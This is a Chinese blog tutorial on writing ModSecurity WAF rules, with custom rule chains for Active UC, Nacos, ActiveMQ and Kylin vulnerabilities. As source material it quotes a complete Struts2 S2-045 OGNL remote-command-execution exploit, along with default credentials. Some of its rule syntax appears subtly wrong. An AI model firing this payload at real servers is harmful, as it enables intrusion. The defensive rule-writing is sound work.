## 0x01 简介

ModSecurity是一个开源的、跨平台的Web应用防火墙，它可以通过检查Web服务接收到的数据，以及发送出去的数据来对网站进行安全防护。

ModSecurity有以下作用：

> SQL Injection (SQLi)：阻止SQL注入  
> Cross Site Scripting (XSS)：阻止跨站脚本攻击  
> Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击  
> Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击  
> Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击  
> PHP Code Injectiod：阻止PHP代码注入  
> HTTP Protocol Violations：阻止违反HTTP协议的恶意访问  
> HTTPoxy：阻止利用远程代理感染漏洞进行攻击  
> Sshllshock：阻止利用Shellshock漏洞进行攻击  
> Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击  
> Scanner Detection：阻止黑客扫描网站  
> Metadata/Error Leakages：阻止源代码/错误信息泄露  
> Project Honey Pot Blacklist：蜜罐项目黑名单  
> GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断

## 0x02 规则介绍

根据配置手册，我们了解到分为这几部分，包含配置指令，处置阶段、变量、转换函数、动作以及运算符。看过规则追后，个人感觉转换函数这个规则部分在自建规则这里使用不到，简单总结一下
**部分** 会用到的规则以及动作。

#### 配置指令

SecRules

创建一个使用所选运算符分析指定变量的规则。

> SecRule VARIABLES OPERATOR [ACTIONS]

eg:

> SecRule ARGS "@rx attack" "phase:1,log,deny,id:1"

#### 处理阶段

ModSecurity 2.x允许将规则置于Apache请求周期的以下五个阶段之一：

> 请求头（REQUEST_HEADERS）
>
> 请求体（REQUEST_BODY）
>
> 响应头（RESPONSE_HEADERS）
>
> 响应体（RESPONSE_BODY）
>
> 日志记录（LOGGING）

五个阶段图示如下：

![Snipaste_2021-07-26_14-22-19.png](https://image.3001.net/images/20220815/1660545400_62f9e978c4fd310aa54a7.png!small)

#### 变量

  * ARGS

ARGS是一个集合，可以通过静态参数（匹配带有该名称的参数），或是通过正则表达式（匹配所有带有与正则表达式匹配的名称的参数）进行单独使用（包含所有参数，包括POST
Payload）,eg:（下面的“id”都为规则的id序号）

> SecRule ARGS dirty "id:7" #检查dirty所有请求参数的值

> SecRule ARGS:p dirty "id:8" #查看名为p的参数的值（请注意，通常，请求可以包含多个具有相同名称的参数) ":"表示运算符

> SecRule ARGS|!ARGS:z dirty "id:9"
> #检查单词dirty的所有请求参数的值，除了名为z的那些（同样，可以有零个或多个名为z的参数）：

  * Files

包含原始文件名的集合（因为它们是在远程用户的文件系统上调用的）,eg：

> SecRule FILES "@rx .conf$" "id:xxx"

  * FILES_NAMES

包含用于文件上载的表单字段列表,eg:

> SecRule FILES_NAMES "^upfile$" "id:xxx"

  * PATH_INFO

包含额外的请求URI信息，也称为路径信息。eg:

> SecRule PATH_INFO "^/(bin|etc|sbin|opt|usr)" "id:xxx"

  * REMOTE_ADDR

此变量包含远程客户端的IP地址。eg:

> SecRule REMOTE_ADDR "@ipMatch 192.168.1.101" "id:xxx"

  * REMOTE_PORT

此变量包含有关客户端在启动与Web服务器的连接时使用的源端口的信息。。eg:

> SecRule REMOTE_PORT "@lt 1024" "id:xxx"

  * REMOTE_USER

此变量包含经过身份验证的用户的用户名。eg:

> SecRule REMOTE_USER "@streq admin" "id:xxx"

  * REQBODY_PROCESSOR

包含当前使用的请求体处理器的名称。可能的值是URLENCODED，MULTIPART和XML。eg:

> SecRule REQBODY_PROCESSOR "^XML$ chain,id:xxx

> SecRule XML "@validateDTD /opt/apache-frontend/conf/xml.dtd"

  * REQUEST_BASENAME

该变量仅包含REQUEST_FILENAME的文件名部分（例如，index.php）。eg:

> SecRule REQUEST_BASENAME "^login.php$" phase:2,id:xxx,t:none,t:lowercase

  * REQUEST_BODY

包含原始请求体。仅当使用URLENCODED请求体处理器时该变量才有效，即，当检测到application / x-www-form-urlencoded内容类型时，或者强制使用URLENCODED请求体解析器时，此变量才有效。

> SecRule REQUEST_BODY "^username=\w{25,}&password=\w{25,}&Submit=login$"
> "id:xxx"

  * REQUEST_COOKIES

此变量是所有请求cookie的集合（仅包含值）。eg:

> SecRule &REQUEST_COOKIES "@eq 0" "id:xxx" #请求中没有任何Cookie头

#### 动作

  * chain

使用紧随其后的规则与当前规则进行链接，形成规则链。链式规则允许更复杂的处理逻辑

#拒绝接受不包含Content-Length标头或Content-Length的值为0的POST请求。

#（请注意，此规则应在规则之前验证仅使用有效的请求方法。）

> SecRule REQUEST_METHOD "^POST$" phase:1,chain,t:none,id:xxx

> SecRule REQUEST_HEADERS:Content-Length "@eq 0" t:none

注意：规则链的作用与AND一致。仅当多条规则中的变量检查同时匹配成功时，才会触发链式规则的第一条规则中指定的阻断性操作。链式规则中无论哪一条规则没有匹配成功，则表示整个规则链匹配失败，即不会执行阻断性动作。

手册上面的第二条语句为

`SecRule &REQUEST_HEADERS:Content-Length "@eq 0" t:none`

但是在实际应用中添加“&”符号会报错，所以在写规则链的时候需要注意。

  * drop

通过发送FIN数据包立即关闭TCP连接。

  * deny

停止规则处理并拦截此次访问。

  * block

执行SecDefaultAction定义的阻断性动作。

> SecDefaultAction phase:2,deny,id:xxx,status:403,log,auditlog #配置阻断后所执行的的默认动作  
> SecRule ARGS attack1 phase:2,block,id:xxx #检测我们想要阻止的攻击  
> SecRule ARGS attack2 phase:2,pass,id:xxx #检测我们只想警告的攻击

  * msg

将自定义信息分配给规则或规则链。 该消息将与每次警报一起记录到日志中。

> SecRule &REQUEST_HEADERS:Host "@eq 0" "log,id:xxxx,severity:2,msg:'无请求主机'"

#### 运算符

  * beginsWith

如果在输入的开头找到参数字符串，则返回true。eg：

> SecRule REQUEST_LINE "@beginsWith GET" "id:xxx" #检测以“GET”开头的请求行

  * contains

如果在输入中的任何位置找到参数字符串，则返回true。eg：

> SecRule REQUEST_LINE "@contains .php" "id:xxxx" #在请求行中的任何位置检测是否包含“.php”字符串

  * containsWord

如果在输入中的任何位置找到参数字符串（带有字边界），则返回true。

> SecRule ARGS "@containsWord select" "id:xxx" #在ARGS的任何地方检测是否包含“select”字符串

  * rx

通过提供的正则表达式，对指定的变量进行匹配检测。rx是默认运算符，所有未明确指定运算符的规则都将默认使用@rx作为运算符。

> SecRule REQUEST_HEADERS:User-Agent "@rx " "id:xxx" #检测xss攻击

  * streq

执行字符串比较，如果给定的参数字符串与输入字符串相同，则返回true。

> SecRule ARGS:foo "!@streq bar" "id:xxx" #在请求参数“foo”中检测不包含“bar”

## 0x03 自建规则

#### 网动统一通信平台(Active UC)RCE漏洞

goby的poc参考链接：

>
> [https://github.com/TheTh1nk3r/Goby_POC/blob/main/Active_UC_index.action_RCE.json](https://www.sec-> in.com/outLinkPage/?target=https://github.com/TheTh1nk3r/Goby_POC/blob/main/Active_UC_index.action_RCE.json)

ModSecurity规则如下：参考github上的POC

    
    
    {
          "Name": "Active UC index.action 远程命令执行漏洞",
          "Level": "3",
          "Tags": [
                "RCE"
          ],
          "GobyQuery": "title=\"网动统一通信平台(Active UC)\"",
          "Description": "网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令",
          "Product": "网动统一通信平台(Active UC)",
          "Homepage": "https://gobies.org/",
          "Author": "luckying",
          "Impact": "",
          "Recommandation": "",
          "References": [
                "https://gobies.org/"
          ],
      "HasExp": true,
      "ExpParams": [
    {
    "name": "Cmd",
    "type": "input",
    "value": "whoami",
    "show": ""
    }
      ],
          "ScanSteps": [
                "AND",
                {
                      "Request": {
                            "method": "POST",
                            "uri": "/acenter/index.action",
                            "follow_redirect": false,
                            "header": {
                                  "Accept-Encoding": "gzip, deflate",
                                  "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                                  "Connection": "close",
                                  "Cookie": "SessionId=96F3F15432E0660E0654B1CE240C4C36",
                                  "Charsert": "UTF-8",
                                  "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ipconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170",
                                  "Cache-Control": "no-cache",
                                  "Pragma": "no-cache"
                            },
                            "data_type": "text",
                            "data": "-----------------------------18012721719170\nContent-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\"\nContent-Type: text/plain\n-----------------------------18012721719170"
                      },
                      "ResponseTest": {
                            "type": "group",
                            "operation": "AND",
                            "checks": [
                                  {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "Windows IP",
                                        "bz": ""
                                  }
                            ]
                      },
                      "SetVariable": []
                }
          ],
      "ExploitSteps": [
                "AND",
                {
                      "Request": {
                            "method": "POST",
                            "uri": "/acenter/index.action",
                            "follow_redirect": false,
                            "header": {
                                  "Accept-Encoding": "gzip, deflate",
                                  "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                                  "Connection": "close",
                                  "Cookie": "SessionId=96F3F15432E0660E0654B1CE240C4C36",
                                  "Charsert": "UTF-8",
                                  "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{{Cmd}}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170",
                                  "Cache-Control": "no-cache",
                                  "Pragma": "no-cache"
                            },
                            "data_type": "text",
                            "data": "-----------------------------18012721719170\nContent-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\"\nContent-Type: text/plain\n-----------------------------18012721719170"
                      },
                      "ResponseTest": {
                            "type": "group",
                            "operation": "AND",
                            "checks": [
                                  {
                                        "type": "item",
                                        "variable": "$body",
                                        "operation": "contains",
                                        "value": "Windows IP",
                                        "bz": ""
                                  }
                            ]
                      },
                      "SetVariable": [
    "output|lastbody"
      ]
                }
          ],
    }
    

这里设置的是扫描阶段的检测POC的防御规则，对于防御来说，规则的设置可以精确到字符串或者精确到字段都可以，策略如果设置的过于精确，造成的结果就是可能误报率过高，对正常的业务造成影响，策略设置的比较宽松，就会无法检测攻击行为，起不到防护效果。

那么这个规则的设置分为三部分，并未对返回包进行检测规则的设置

  * 规则设置请求方式为POST，在使用规则之前验证有效请求POST
  * 规则设置访问路径为“/acenter/index.action”
  * 规则设置匹配构造的请求包的请求体内的字段“Content-Type”的内容（这条规则的设置可能只能起到检测该poc的目的，所以针对该漏洞的规则的设置需要更多的规则）
  * 注意：规则链的作用与AND一致。仅当多条规则中的变量检查同时匹配成功时，才会触发链式规则的第一条规则中指定的阻断性操作。链式规则中无论哪一条规则没有匹配成功，则表示整个规则链匹配失败，即不会执行阻断性动作。

> SecRule REQUEST_METHOD "^POST$" "chain,msg: 'Active UC
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/acenter/index.action" "chain"

> SecRule REQUEST_BODY:Content-Type "@rx (?i)cmd|(?!)system"

#### Nacos 未授权访问漏洞

扫描防御规则链如下：

  * 规则设置请求方式为GET，在使用规则之前验证有效请求GET

  * 规则设置访问路径为“/nacos/v1/auth/users?"

  * 规则设置请求体内的"data"数据为null即等于0

  * 规则设置服务器发送的完整状态500

> SecRule REQUEST_METHOD "^GET$" "chain,msg: 'Nacos unauthorized
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/nacos/v1/auth/users?" "chain"

> SecRule REQUEST_BODY:data "@eq 0" "chain"

> SecRule STATUS_LINE "@contains 500"

EXp防御规则链如下：

  * 规则设置请求方式为POST，在使用规则之前验证有效请求POST

  * 规则设置访问路径为“/nacos/v1/auth/users?"

  * 规则设置请求体内的"data"数据不为null

> SecRule REQUEST_METHOD "^POST$" "chain,msg: 'Nacos unauthorized
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/nacos/v1/auth/users?" "chain"

> SecRule REQUEST_BODY:data "!@eq 0"

#### Nacos 控制台默认弱口令

扫描防御规则链如下：

  * 规则设置请求方式为POST，在使用规则之前验证有效请求POST
  * 规则设置访问路径为“/nacos/v1/auth/users/login"
  * 规则设置访问的数据传输的内容“username=nacos&password=nacos”

> SecRule REQUEST_METHOD "^POST$" "chain,msg: 'Nacos Default Password
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/nacos/v1/auth/users/login" "chain"

> SecRule REQUEST_BODY:data "username=nacos&password=nacos"

EXp防御规则链如下：

> SecRule REQUEST_METHOD "^POST$" "chain,msg: 'Nacos Default Password
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/nacos/v1/auth/users/login" "chain"

> SecRule REQUEST_BODY:data "username=nacos&password=nacos"

默认口令的账号密码都为nacos，所以这里不管是扫描还是利用都是一样的规则。

#### Apache ActiveMQ Console控制台默认口令

防御规则链如下：

  * 规则设置请求方式为GET，在使用规则之前验证有效请求GET

  * 规则设置访问路径为“/admin"

  * 在apache该中间件中账号以及密码的传输的格式为base64(admin:admin),传输的时候为“Basic YWRtaW46YWRtaW4=”

> SecRule REQUEST_METHOD "^GET$" "chain,msg: 'Apache ActiveMQ Default Password
> Attack',severity:ERROR,deny,status:404,id:xxx"

> SecRule REQUEST_URI "/admin" "chain"

> SecRule REQUEST_Header "@rx ^YWRtaW46YWRtaW4=$"

默认口令的账号密码为admin:admin，所以这里不管是扫描还是利用都是一样的规则。

#### CVE-2020-13937 Kylin 未授权配置泄露

防御规则链如下：

  * 规则设置请求方式为GET，在使用规则之前验证有效请求GET
  * 规则设置访问路径为"/kylin/api/admin/config"

> SecRule REQUEST_METHOD "^GET$" "chain,msg: 'Kylin unauthorized config Link
> Attack(CVE-2020-13937)',severity:ERROR,deny,status:404,id:xxx"
>
> SecRule REQUEST_URI "/kylin/api/admin/config"

## 0x04 小结

这边选择使用网上使用的一些漏洞poc来编写自建规则。当然Vulhub漏洞库的一些poc或者是goby发布的一些自写POC都可以作为修改，验证自己本地搭建平台使用规则作为验证条件即可。当然，可能有的师傅考虑到这个自建规则有什么用，只不过可以搭建一个自用的漏洞检测平台，使用自建的规则库，好不好用完全取决于自建的漏洞库的poc有多庞大，因为这个规则跟现在使用的众多大厂的态势感知使用的规则以及匹配模式有点相似，所以正好拿出来自己尝试一下另外和师傅们做一个分享！！！

